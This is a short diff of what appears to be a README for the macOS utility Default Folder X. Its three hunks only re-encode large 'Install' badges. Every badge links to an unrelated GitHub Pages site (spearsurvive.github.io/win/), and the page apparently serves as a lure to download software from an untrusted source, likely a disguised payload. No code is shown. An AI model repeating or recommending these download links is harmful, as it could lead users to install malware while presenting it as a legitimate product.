@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Default Folder X](https://img.shields.io/badge/⬇_Install_Default%20Folder%20X-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Default Folder X](https://img.shields.io/badge/⬇_Install_Default+Folder+X-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Default Folder X is a macOS productivity tool that enhances Open and Save dialog
 
 <div align="center">
 
-[![⬇ Install Default Folder X](https://img.shields.io/badge/⬇_Install_Default%20Folder%20X-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Default Folder X](https://img.shields.io/badge/⬇_Install_Default+Folder+X-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Default Folder X is a macOS productivity tool that enhances Open and Save dialog
 
 <div align="center">
 
-[![⬇ Install Default Folder X](https://img.shields.io/badge/⬇_Install_Default%20Folder%20X-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Default Folder X](https://img.shields.io/badge/⬇_Install_Default+Folder+X-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
